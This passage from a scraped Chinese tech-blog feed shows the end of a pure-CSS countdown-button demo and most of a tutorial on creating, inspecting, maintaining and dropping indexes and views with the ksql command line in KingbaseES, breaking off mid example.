  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>纯CSS实现发送验证码读秒倒数 - if函数妙用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-keyword">@property</span> --num {
      syntax: <span class="hljs-string">"&lt;integer&gt;"</span>;
      initial-value: <span class="hljs-number">0</span>;
      inherits: true;
    }
    <span class="hljs-selector-pseudo">:root</span> {
      <span class="hljs-attr">--sec</span>: <span class="hljs-number">11</span>;
    }
    <span class="hljs-selector-tag">label</span> {
      <span class="hljs-attr">--num</span>: <span class="hljs-built_in">var</span>(--sec);
      counter-set: count <span class="hljs-built_in">var</span>(--num);
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): blue; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): blue; else: <span class="hljs-number">#999</span>; );
      <span class="hljs-attribute">pointer-events</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): initial; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): initial; else: none; );
      <span class="hljs-attribute">cursor</span>: pointer;
    }
    <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">::after</span> {
      <span class="hljs-attr">--num</span>: inherit;
      <span class="hljs-attribute">content</span>: <span class="hljs-string">"发送验证码"</span>;
    }
    <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>)<span class="hljs-selector-pseudo">::after</span> {
      <span class="hljs-attribute">content</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-number">0</span>): <span class="hljs-string">"重新发送"</span>; else: <span class="hljs-built_in">counter</span>(count) <span class="hljs-string">"秒后可重新发送"</span>; );
    }
    <span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>) {
      <span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>;
      <span class="hljs-attribute">transition</span>: --num <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--sec) * <span class="hljs-number">1s</span>) <span class="hljs-built_in">steps</span>(<span class="hljs-built_in">var</span>(--sec), jump-start);
    }
    <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">input</span> {
      <span class="hljs-attribute">display</span>: none;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"send-code"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"send-code"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑]]></title>    <link>https://juejin.cn/post/7601464318409457706</link>    <guid>https://juejin.cn/post/7601464318409457706</guid>    <pubDate>2026-02-02T01:40:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601464318409457706" data-draft-id="7601387539335479332" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-02-02T01:40:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xcLeigh"/> <meta itemprop="url" content="https://juejin.cn/user/1775071503323875"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1775071503323875/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xcLeigh
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-02T01:40:20.000Z" title="Mon Feb 02 2026 01:40:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">KingbaseES数据库：ksql 命令行玩转索引与视图，从创建到避坑</h2>
<blockquote>
<p>本文聚焦 KingbaseES 数据库中 ksql 命令行对索引与视图的操作，先介绍前置准备，需连接数据库切换至目标模式（如 test_schema），确认并创建 sys_user 表，插入测试数据。接着详解索引管理，涵盖普通、唯一、复合三类索引的创建方法，用 \di、\d + 命令查看索引，通过重建、重命名、删除进行维护，还给出索引数量不超 5 个、小表无需建索引等避坑提示。然后阐述视图管理，包括基础、进阶、只读视图的创建，用 \dv、\d + 命令查看，以及查询、修改、删除操作，强调视图修改限制等注意事项。最后排查高频报错，总结索引与视图配合使用要点，助力新手掌握高效查询技能。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3cb22951c3d74268b450eff84b73f6cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGNMZWlnaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770601220&amp;x-signature=Y%2FoZtfC%2FvZ5IuymebfSoq1VJh5Y%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d34bcdae126460cbf4f2d54b7c90145~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGNMZWlnaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770601220&amp;x-signature=%2Bo%2BhMrn0xwsmcYKwBOHelbsXiWA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>学会了表的基本操作后，要是想让查询更快、访问数据更省事，那“索引”和“视图”这俩好帮手可得好好学一学。说起来，索引就像咱们看书时的目录，翻找内容能省不少劲；视图呢，更像是个专属数据窗口，不仅能把复杂的查询逻辑藏起来，还能控制哪些数据能被看到。今天咱就专门聊聊“ksql命令行操作索引与视图”，从它们的作用、创建方法，到怎么查看、维护，最后怎么删除，一步步拆成实实在在的操作步骤，再配上例子和避坑小提示，保证新手朋友也能看懂、能用起来。</p>
<h3 data-id="heading-1">一、前置准备：确认操作基础（衔接前文，确保连贯）</h3>
<p>索引和视图都得依托已有的表才能用，所以咱得先做好下面这些准备工作（大家可以参考第四篇“表的运作”的相关内容），别到时候操作半天，因为少了基础依赖弹出一堆错误提示，那就麻烦了。</p>
<h4 data-id="heading-2">1.1 连接数据库并切换目标模式</h4>
<p>先用ksql连上本地的KingbaseES数据库，再切换到之前创建的<code>test_schema</code>模式里。接着得确认一下目标表在不在，就拿<code>sys_user</code>表举例，要是没有，要么重新建一个，要么换个新例子表，总之得保证后面的操作能顺利进行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 连接数据库（若未连接）</span>
ksql <span class="hljs-operator">-</span>d kingbase <span class="hljs-operator">-</span>U <span class="hljs-keyword">system</span>
<span class="hljs-comment">-- 2. 切换到 test_schema 模式</span>
<span class="hljs-keyword">SET</span> search_path <span class="hljs-keyword">TO</span> test_schema, public;
<span class="hljs-comment">-- 3. 确认目标表存在（如 sys_user 表）</span>
\dt sys_user;
<span class="hljs-comment">-- 若不存在，创建示例表（用于后续索引/视图操作）</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> sys_user (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    phone <span class="hljs-type">CHAR</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    email <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    create_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
) TABLESPACE test_ts;
</code></pre>
<p>执行完要是显示<code>Table "test_schema.sys_user" does not exist</code>，那就先执行上面的<code>CREATE TABLE</code>语句建表，有了表，后面的操作才有载体。</p>
<h4 data-id="heading-3">1.2 插入测试数据（用于验证索引/视图效果）</h4>
<p>为了后面能测试索引的查询速度，也能看看视图展示数据的样子，得给<code>sys_user</code>表加些模拟数据。最好多加点，比如上千条，这样更贴近真实使用场景。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 批量插入10条测试数据（可复制扩展）</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> test_schema.sys_user (name, phone, email)
<span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'张三'</span>, <span class="hljs-string">'13800138000'</span>, <span class="hljs-string">'zhangsan@test.com'</span>),
(<span class="hljs-string">'李四'</span>, <span class="hljs-string">'13900139000'</span>, <span class="hljs-string">'lisi@test.com'</span>),
(<span class="hljs-string">'王五'</span>, <span class="hljs-string">'13700137000'</span>, <span class="hljs-string">'wangwu@test.com'</span>),
(<span class="hljs-string">'赵六'</span>, <span class="hljs-string">'13600136000'</span>, <span class="hljs-string">'zhaoliu@test.com'</span>),
(<span class="hljs-string">'孙七'</span>, <span class="hljs-string">'13500135000'</span>, <span class="hljs-string">'sunqi@test.com'</span>),
(<span class="hljs-string">'周八'</span>, <span class="hljs-string">'13400134000'</span>, <span class="hljs-string">'zhouba@test.com'</span>),
(<span class="hljs-string">'吴九'</span>, <span class="hljs-string">'13300133000'</span>, <span class="hljs-string">'wujiu@test.com'</span>),
(<span class="hljs-string">'郑十'</span>, <span class="hljs-string">'13200132000'</span>, <span class="hljs-string">'zhengshi@test.com'</span>),
(<span class="hljs-string">'钱一'</span>, <span class="hljs-string">'13100131000'</span>, <span class="hljs-string">'qianyi@test.com'</span>),
(<span class="hljs-string">'冯二'</span>, <span class="hljs-string">'1300130000'</span>, <span class="hljs-string">'fenger@test.com'</span>);
</code></pre>
<p>执行后要是提示<code>INSERT 0 10</code>，那就说明数据插成功了，后面的测试就有了基础。</p>
<h3 data-id="heading-4">二、索引管理：给表“加目录”，加速查询</h3>
<p>在KingbaseES里，想让查询变快，索引可是核心手段。你想啊，要是表的数据量大，比如有10万条以上，没索引的话，查询就得“全表扫描”，一条一条找，多慢啊；但有了索引就不一样了，相当于有了“目录”，直接定位到数据，速度能快成百上千倍。接下来咱就按“创建→查看→维护→删除”的顺序好好说说。</p>
<h4 data-id="heading-5">2.1 先懂基础：索引的类型与适用场景</h4>
<p>新手朋友得先搞明白不同索引有啥用，可别瞎创建。要知道，索引不是越多越好，多了反而会增加数据更新、插入的开销。</p>
<h4 data-id="heading-6">2.2 创建索引：用CREATE INDEX语句</h4>
<h5 data-id="heading-7">2.2.1 示例1：创建普通索引（加速单字段查询）</h5>
<p>要是经常按手机号查用户，那给<code>sys_user</code>表的<code>phone</code>列建个普通索引就很合适。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE INDEX 索引名 ON 表名(字段名);</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_sys_user_phone <span class="hljs-keyword">ON</span> test_schema.sys_user(phone);
</code></pre>
<ul>
<li><strong>索引名规范</strong>：建议用“idx_表名_字段名”这种格式，比如“idx_sys_user_phone”，一看就知道是“sys_user”表里“phone”列的索引，多好认。</li>
<li><strong>成功验证</strong>：执行后提示<code>CREATE INDEX</code>，那就说明索引建好了。</li>
</ul>
<h5 data-id="heading-8">2.2.2 示例2：创建唯一索引（确保字段唯一+加速查询）</h5>
<p>给<code>sys_user</code>表的<code>email</code>列建个唯一索引也不错，既能保证邮箱不重复，查邮箱的时候也能更快。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE UNIQUE INDEX 索引名 ON 表名(字段名);</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">UNIQUE</span> INDEX idx_sys_user_email <span class="hljs-keyword">ON</span> test_schema.sys_user(email);
</code></pre>
<ul>
<li><strong>与UNIQUE约束的区别</strong>：这里得提醒一句，唯一索引只是保证值不重复，而UNIQUE约束里既包含了约束，也自带了唯一索引。所以要是表已经有<code>email</code>的UNIQUE约束，就不用再特意给<code>email</code>建唯一索引了，约束本身就会生成索引。</li>
</ul>
<h5 data-id="heading-9">2.2.3 示例3：创建复合索引（加速多字段组合查询）</h5>
<p>要是经常按“姓名+创建时间范围”查数据，那给<code>sys_user</code>表的<code>name</code>和<code>create_time</code>列建个复合索引就很实用。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE INDEX 索引名 ON 表名(字段1, 字段2);</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_sys_user_name_createtime <span class="hljs-keyword">ON</span> test_schema.sys_user(name, create_time);
</code></pre>
<ul>
<li><strong>字段顺序注意</strong>：复合索引有个“最左符合原则”，比如这个索引(name, create_time)，能加快name单字段的查询，也能加快name+create_time组合的查询，但没法加快create_time单字段的查询。所以字段顺序得根据平时的查询习惯来定，可别搞反了。</li>
</ul>
<h4 data-id="heading-10">2.3 查看索引：确认索引存在与关联表</h4>
<p>建完索引，得用ksql命令看看索引列表、关联的表还有详细信息，推荐大家用<code>\di</code>和<code>\dt+</code>这两个命令，很好用。</p>
<h5 data-id="heading-11">2.3.1 示例1：查看所有索引（\di命令）</h5>
<p>执行<code>\di</code>就能列出当前模式下的所有索引，能快速确认索引是不是建成功了。</p>
<pre><code class="hljs language-sql" lang="sql">\di
</code></pre>
<p><strong>执行结果示例关键信息解读</strong>：</p>
<ul>
<li><code>Table</code>：能看到索引关联的表，确认是不是<code>sys_user</code>表；</li>
<li><code>Columns</code>：能知道索引对应的字段，是单字段还是多字段；</li>
<li><code>sys_user_pkey</code>：这个是主键自动创建的索引，不用咱们手动建。</li>
</ul>
<h5 data-id="heading-12">2.3.2 示例2：查看表关联的索引（\dt+表名）</h5>
<p>要是想查看某张表的所有索引，比如<code>sys_user</code>表，执行<code>\d+ 表名</code>就行。</p>
<pre><code class="hljs language-sql" lang="sql">\d<span class="hljs-operator">+</span> test_schema.sys_user
</code></pre>
<p><strong>执行结果示例（索引部分）</strong>：
这样能直接看到表关联的所有索引，包括索引类型（是PRIMARY KEY、UNIQUE还是普通索引）和对应的字段，清晰又直观，一眼就能看明白。</p>
<h4 data-id="heading-13">2.4 索引维护：优化性能与调整结构</h4>
<p>索引用久了，因为数据经常被删除、更新，可能会出现“碎片化”的情况，就是索引文件里有不少空白空间，这时候就得重建索引来改善。另外，要是想给索引重命名，或者删掉没用的索引，也有对应的方法。</p>
<h5 data-id="heading-14">2.4.1 示例1：重建索引（解决碎片化，提升查询速度）</h5>
<p>要是感觉索引查询变慢了，重建索引就能整理碎片，让性能恢复。不过要注意，要是表很大，最好离线执行，别影响正常业务。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：REINDEX INDEX 索引名;</span>
REINDEX INDEX idx_sys_user_phone;
<span class="hljs-comment">-- 进阶：重建表的所有索引（更高效）</span>
REINDEX <span class="hljs-keyword">TABLE</span> sys_user;
</code></pre>
<ul>
<li><strong>成功验证</strong>：执行后提示<code>REINDEX</code>，就说明重建完成了。</li>
</ul>
<h5 data-id="heading-15">2.4.2 示例2：重命名索引（规范命名）</h5>
<p>要是索引名不符合规范，比如想把<code>idx_sys_user_phone</code>改成<code>idx_sys_user_mobile</code>，直接重命名就行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：ALTER INDEX 旧索引名 RENAME TO 新索引名;</span>
<span class="hljs-keyword">ALTER</span> INDEX idx_sys_user_phone RENAME <span class="hljs-keyword">TO</span> idx_sys_user_mobile;
</code></pre>
<ul>
<li><strong>验证</strong>：执行<code>\d+ test_schema.sys_user</code>，就能看到索引名已经更新了。</li>
</ul>
<h5 data-id="heading-16">2.4.3 示例3：删除索引（无用索引清理）</h5>
<p>要是某个字段查询频率变低了，或者因为索引导致数据插入、更新变慢，那就得把没用的索引删掉。不过要注意，主键索引和跟唯一约束相关的索引不能直接删，得先把约束删掉才行。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：DROP INDEX IF EXISTS 索引名;</span>
<span class="hljs-keyword">DROP</span> INDEX IF <span class="hljs-keyword">EXISTS</span> idx_sys_user_name_createtime;
</code></pre>
<ul>
<li><code>IF EXISTS</code>：加这个是为了避免索引不存在的时候报错，只会提示个警告，很贴心；</li>
<li><strong>验证</strong>：执行<code>\d+ test_schema.sys_user</code>，确认索引已经删掉了就行。</li>
</ul>
<h4 data-id="heading-17">2.5 索引使用注意事项（新手避坑指南）</h4>
<ol>
<li>千万别觉得索引越多越好，索引多了，数据插入、更新、删除的时候开销都会变大。毕竟数据一变，索引也得跟着同步更新，多费事儿啊。所以一张表的索引最好别超过5个。</li>
<li>小表就别建索引了，要是数据量不到1万条，全表扫描比用索引查还快。你想啊，用索引还得先找索引再找数据，多了一次IO操作，反而慢了。</li>
<li>经常更新的列别建索引，比如“订单状态”这种字段，每秒都可能变，给它建了索引，索引就得频繁同步更新，多影响整体性能啊。</li>
<li>别对索引字段用函数，比如<code>WHERE SUBSTR(phone,1,3) = '138'</code>这种写法，会让索引失效。改成<code>WHERE phone LIKE '138%'</code>就好，前缀匹配是能用到索引的。</li>
</ol>
<h3 data-id="heading-18">三、视图管理：给数据“开窗口”，简化查询与控制权限</h3>
<p>视图其实是“虚拟表”，它是根据SQL查询结果生成的，本身不存实际数据，数据还在原始表里。但它的用处可不小，能“隐藏复杂查询逻辑”，还能“控制数据可见范围”，比如只让用户看到某些列。下面咱就按“创建-查看-操作-删除”的顺序来讲。</p>
<h4 data-id="heading-19">3.1 先懂基础：视图的核心作用（新手必知）</h4>
<p>新手朋友容易把“表”和“视图”搞混，我给大家打个通俗的比方：</p>
<ul>
<li>表就像“仓库”，里面实实在在存着数据；</li>
<li>视图呢，就是“仓库窗口”，通过这个窗口只能看到指定区域的货物（数据），整个仓库的情况是看不到的。而且这个窗口不能直接改，想改仓库里的数据得通过窗口，但还有不少限制。</li>
</ul>
<p>视图的核心使用场景有这几个：</p>
<ol>
<li>简化复杂查询，要是有很多表关联查询（JOIN），可以把它封装成视图，后面查数据直接用视图就行，不用再写一遍复杂的SQL，多省事儿。</li>
<li>控制数据权限，比如想让普通用户只看到<code>sys_user</code>表里的<code>name</code>和<code>phone</code>字段，把<code>email</code>这种敏感信息藏起来，用视图就能做到。</li>
<li>保证数据一致性，要是多个系统都用同一个查询逻辑，用视图就能确保所有系统都用一样的筛选条件，不会出乱子。</li>
</ol>
<h4 data-id="heading-20">3.2 创建视图：用CREATE VIEW语句</h4>
<h5 data-id="heading-21">3.2.1 示例1：基础视图（简化单表查询）</h5>
<p>咱创建一个“用户基础信息视图<code>vw_sys_user_basic</code>”，里面只包含<code>id</code>、<code>name</code>、<code>phone</code>列，把<code>email</code>这种敏感信息藏起来。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 语法：CREATE VIEW 视图名 AS SELECT 语句;</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> vw_sys_user_basic <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> id, name, phone 
<span class="hljs-keyword">FROM</span> test_schema.sys_user;
</code></pre>
<ul>
<li><strong>成功验证</strong>：执行后提示<code>CREATE VIEW</code>，就说明视图建好了。</li>
</ul>
<h5 data-id="heading-22">3.2.2 示例2：进阶视图（带筛选条件的复杂查询）</h5>
<p>再创建一个“2024年创建的用户视图<code>vw_sys_user_2024</code>”，筛选出<code>create_time</code>在2024年的用户，里面包含<code>name</code>、<code>email</code>、<code>create_time</code>列。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> vw_sys_user_2024 <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, email, create_time 
<span class="hljs-keyword">FROM</span> test_schema.sys_user 
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2024-01-01 00:00:00'</span> 
  <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-01 00:00:00'</span>;
</code></pre>
<ul>
<li><strong>动态性</strong>：这里得说一下，视图里的数据会跟着原表自动变。比如原表新增了一个2024年创建的用户，视图里也会自动包含这条数据，不用手动更新。</li>
</ul>
<h5 data-id="heading-23">3.2.3 示例3：只读视图（禁止修改数据）</h5>
<p>要是想确保视图里的数据不能被改，比如报表视图，那就加个<code>WITH READ ONLY</code>选项。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> vw_sys_user_report <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">SELECT</span> name, phone, create_time 
<span class="hljs-keyword">FROM</span> test_schema.sys_user 
<span class="hljs-keyword">WITH</span> READ <span class="hljs-keyword">ONLY</span>;
</code></pre>
<ul>
<li><strong>效果</strong>：后面要是想通过这个视图改数据，比如执行<code>UPDATE vw_sys_user_report SET name='张三'</code>，就会报错“cannot update a read-only view”，根本改不了。</li>
</ul>
<h4 data-id="heading-24">3.3 查看视图：确认视图定义与关联表</h4>
<p>建完视图，得用ksql命令看看视图列表、定义还有关联的表，推荐用<code>\dv</code>和<code>\d+</code>这两个命令。</p>
<h5 data-id="heading-25">3.3.1 示例1：查看所有视图（\dv命令）</h5>
<p>执行<code>\dv</code>就能列出当前模式下的所有视图，能快速确认视图是不是建成功了。</p>
<h5 data-id="heading-26">3.3.2 示例2：查看视图定义（\d+视图名）</h5>
<p>要是忘了视图的筛选条件，想确认一下视图的底层SQL，执行<code>\d+ 视图名</code>就行。</p>
<pre><code class="hljs language-sql" lang="sql">\d<span class="hljs-operator">+</span> vw_sys_user_2024
</code></pre>
<p><strong>执行结果示例（定义部分）</strong>：
这样能直接看到视图完整的SQL定义，后面想修改或者验证逻辑都很方便。</p>
<h4 data-id="heading-27">3.4 视图操作：查询、修改与删除</h4>
<p>视图最主要的操作是“查询”，修改和删除都有特定的规则，可不能随便来。</p>
<h5 data-id="heading-28">3.4.1 示例1：查询视图数据（与表查询一致）</h5>
<p>查询视图数据的语法和查表一模一样，不用额外学新东西。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询基础视图数据</span>
